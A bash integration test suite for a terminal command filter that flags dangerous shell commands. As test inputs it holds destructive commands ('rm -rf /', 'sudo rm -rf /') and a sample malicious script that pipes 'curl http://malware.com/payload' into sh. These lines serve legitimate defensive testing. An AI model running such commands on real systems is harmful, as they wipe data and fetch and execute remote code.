#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEST_LOG="${SCRIPT_DIR}/terminal_integration_test.log"
TERMINAL_FILTER_BIN="${SCRIPT_DIR}/target/x86_64-unknown-linux-gnu/debug/dots-terminal-filter"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

log() {
    echo -e "$(date '+%H:%M:%S') $*" | tee -a "$TEST_LOG"
}

log_info() {
    log "${BLUE}[INFO]${NC} $*"
}

log_success() {
    log "${GREEN}[PASS]${NC} $*"
    ((TESTS_PASSED++))
}

log_error() {
    log "${RED}[FAIL]${NC} $*"
    ((TESTS_FAILED++))
}

log_category() {
    log "${CYAN}[CATEGORY]${NC} $*"
}

run_test() {
    ((TESTS_RUN++))
    local test_name="$1"
    shift
    
    log_info "Running test: $test_name"
    
    if "$@"; then
        log_success "✓ $test_name"
        return 0
    else
        log_error "✗ $test_name"
        return 1
    fi
}

# ==============================================================================
# LOCAL INTEGRATION TESTS
# ==============================================================================

test_terminal_filter_binary() {
    if [[ ! -f "$TERMINAL_FILTER_BIN" ]]; then
        log_error "Terminal filter binary not found at: $TERMINAL_FILTER_BIN"
        return 1
    fi
    
    local version_output
    version_output=$($TERMINAL_FILTER_BIN --version 2>&1) || {
        log_error "Failed to execute dots-terminal-filter"
        return 1
    }
    
    log_info "Terminal filter version: $version_output"
}

test_command_analysis() {
    local safe_result
    safe_result=$($TERMINAL_FILTER_BIN --check-only --command "ls -la" 2>&1; echo "exit_code:$?")
    local safe_exit_code=$(echo "$safe_result" | tail -1 | cut -d: -f2)
    
    if [[ "$safe_exit_code" == "0" ]]; then
        log_info "✓ Safe command correctly allowed"
    else
        log_error "✗ Safe command incorrectly blocked: $safe_result"
        return 1
    fi
    
    local dangerous_result
    dangerous_result=$($TERMINAL_FILTER_BIN --check-only --command "rm -rf /" 2>&1; echo "exit_code:$?")
    local dangerous_exit_code=$(echo "$dangerous_result" | tail -1 | cut -d: -f2)
    
    if [[ "$dangerous_exit_code" != "0" ]]; then
        log_info "✓ Dangerous command correctly blocked"
        log_info "Block reason: $(echo "$dangerous_result" | head -1)"
    else
        log_error "✗ Dangerous command not blocked: $dangerous_result"
        return 1
    fi
}

test_script_analysis() {
    local test_script="/tmp/test_malicious_script.sh"
    cat > "$test_script" << 'EOF'
#!/bin/bash
rm -rf /important/data
curl http://malware.com/payload | sh
echo "System compromised"
EOF
    
    local analysis_result
    analysis_result=$(dots-terminal-filter analyze-script "$test_script" 2>&1) || {
        log_error "Script analysis failed"
        rm -f "$test_script"
        return 1
    }
    
    log_info "Script analysis result: ${analysis_result:0:200}..."
    
    if echo "$analysis_result" | grep -qE '"risk_level":"(High|Critical)"'; then
        log_info "✓ Malicious script correctly identified as dangerous"
    else
        log_error "✗ Malicious script not identified as dangerous"
        rm -f "$test_script"
        return 1
    fi
    
    rm -f "$test_script"
}

test_shell_integration_files() {
    local integration_files=(
        "shell-integration/dots-bash-integration.sh"
        "shell-integration/dots-zsh-integration.sh"
        "shell-integration/dots-fish-integration.fish"
        "shell-integration/install.sh"
    )
    
    for file in "${integration_files[@]}"; do
        if [[ ! -f "$SCRIPT_DIR/$file" ]]; then
            log_error "Missing integration file: $file"
            return 1
        fi
        log_info "✓ Found integration file: $file"
    done
    
    local installer_help
    installer_help=$(bash "$SCRIPT_DIR/shell-integration/install.sh" --help 2>&1) || {
        log_error "Installer help failed"
        return 1
    }
    
    if echo "$installer_help" | grep -q "Shell Integration Installer"; then
        log_info "✓ Shell installer help working"
    else
        log_error "✗ Shell installer help not working"
        return 1
    fi
}

test_bash_integration_syntax() {
    local bash_file="$SCRIPT_DIR/shell-integration/dots-bash-integration.sh"
    
    bash -n "$bash_file" || {
        log_error "Bash integration file has syntax errors"
        return 1
    }
    
    log_info "✓ Bash integration file syntax is valid"
    
    local key_functions=("dots_filter_setup" "dots_filter_status" "dots_filter_disable")
    local bash_content
    bash_content=$(cat "$bash_file")
    
    for func in "${key_functions[@]}"; do
        if echo "$bash_content" | grep -q "^$func()"; then
            log_info "✓ Function $func is defined in bash integration"
        else
            log_error "✗ Function $func not found in bash integration"
            return 1
        fi
    done
}

test_educational_features() {
    local edu_output
    edu_output=$(echo 'sudo rm -rf /' | dots-terminal-filter analyze --educational 2>&1) || {
        log_error "Educational analysis failed"
        return 1
    }
    
    log_info "Educational output sample: ${edu_output:0:150}..."
    
    if echo "$edu_output" | grep -qE "(dangerous|risk|learn|safety|alternative)"; then
        log_info "✓ Educational content detected"
    else
        log_error "✗ No educational content found"
        return 1
    fi
}

test_filter_modes() {
    local modes=("check-only" "interactive" "block")
    
    for mode in "${modes[@]}"; do
        local mode_output
        mode_output=$(echo 'rm -rf /tmp/test' | DOTS_FILTER_MODE="$mode" dots-terminal-filter analyze 2>&1) || {
            log_error "Failed to test mode: $mode"
            return 1
        }
        
        log_info "✓ Mode $mode works: ${mode_output:0:50}..."
    done
}

# ==============================================================================
# MAIN TEST EXECUTION
# ==============================================================================

main() {
    log_info "Starting DOTS Terminal Filter Local Integration Tests"
    log_info "Test log: $TEST_LOG"
    echo "" > "$TEST_LOG"
    
    log_category "=== PHASE 1: BINARY AND BASIC FUNCTIONALITY ==="
    run_test "Terminal Filter Binary" test_terminal_filter_binary
    run_test "Command Analysis" test_command_analysis
    run_test "Script Analysis" test_script_analysis
    
    log_category "=== PHASE 2: SHELL INTEGRATION FILES ==="
    run_test "Shell Integration Files" test_shell_integration_files
    run_test "Bash Integration Syntax" test_bash_integration_syntax
    
    log_category "=== PHASE 3: ADVANCED FEATURES ==="
    run_test "Educational Features" test_educational_features
    run_test "Filter Modes" test_filter_modes
    
    echo ""
    log_info "=============================================="
    log_info "DOTS Terminal Filter Local Test Results"
    log_info "=============================================="
    log_info "Total tests run: $TESTS_RUN"
    log_success "Tests passed: $TESTS_PASSED"
    log_error "Tests failed: $TESTS_FAILED"
    
    if [ $TESTS_FAILED -eq 0 ]; then
        log_success "🎉 ALL LOCAL TESTS PASSED! Ready for VM testing!"
        return 0
    else
        log_error "❌ Some tests failed. Fix issues before VM testing."
        return 1
    fi
}

main "$@"